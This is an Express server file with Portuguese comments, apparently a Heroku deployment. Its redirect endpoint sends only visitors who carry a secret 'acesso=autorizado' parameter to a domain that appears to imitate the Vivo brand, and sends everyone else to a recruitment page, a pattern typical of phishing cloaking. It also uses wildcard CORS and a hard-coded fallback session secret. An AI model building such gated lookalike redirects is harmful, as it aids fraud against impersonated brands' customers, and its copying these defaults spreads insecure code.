// Arquivo específico para o Heroku iniciar o servidor
const express = require('express');
const { createServer } = require('http');
const { Pool } = require('@neondatabase/serverless');
const session = require('express-session');
const createMemoryStore = require('memorystore');

// Aplicação Express
const app = express();
app.use(express.json());

// Configurar CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});

// Configurar sessão
const MemoryStore = createMemoryStore(session);
app.use(session({
  secret: process.env.SESSION_SECRET || 'keyboard cat',
  resave: false,
  saveUninitialized: true,
  store: new MemoryStore({
    checkPeriod: 86400000 // prune expired entries every 24h
  }),
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    maxAge: 86400000 
  }
}));

// Servir arquivos estáticos
app.use(express.static('dist/public'));

// Gerenciamento de erros
app.use((err, _req, res, _next) => {
  console.error('Erro na aplicação:', err);
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";
  res.status(status).json({ message, error: true });
});

// Tratamento de rotas específicas que estão causando erros
app.get('/favicon.ico', (req, res) => {
  res.status(204).end(); // No content
});

// Redirecionar rotas acesso-autorizado para o parâmetro correto
app.get('/acesso-autorizado', (req, res) => {
  res.redirect('/?acesso=autorizado');
});

// Endpoint de redirecionamento
app.get('/api/redirect', (req, res) => {
  // Verifica se o parâmetro de acesso está presente
  const hasAuthParam = req.query.acesso === 'autorizado';
  console.log('Parâmetro acesso=autorizado presente:', hasAuthParam);

  // Configuração fixa para demonstração
  const FIXED_CONFIG = {
    domain: 'portal.vivo-cadastro.com',
    alternative_domain: 'atendimentovivo.gupy.io'
  };

  // Determina o domínio alvo baseado na presença do parâmetro de autorização
  const targetDomain = hasAuthParam ? FIXED_CONFIG.domain : FIXED_CONFIG.alternative_domain;
  
  // Constrói a URL de redirecionamento
  const redirectUrl = hasAuthParam 
    ? `https://${targetDomain}?acesso=autorizado` 
    : `https://${targetDomain}`;
  
  console.log('Redirecionando para:', redirectUrl);
  
  // Realiza o redirecionamento
  return res.redirect(307, redirectUrl);
});

// Rota para verificação de status
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production'
  });
});

// Capturar qualquer outra rota e servir o index.html
app.get('*', (req, res) => {
  // Ignorar requisições de API
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: true, message: 'API endpoint not found' });
  }
  
  // Servir o arquivo index.html
  res.sendFile('index.html', { root: './dist/public' });
});

// Iniciar o servidor
const port = process.env.PORT || 5000;
app.listen(port, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${port}`);
});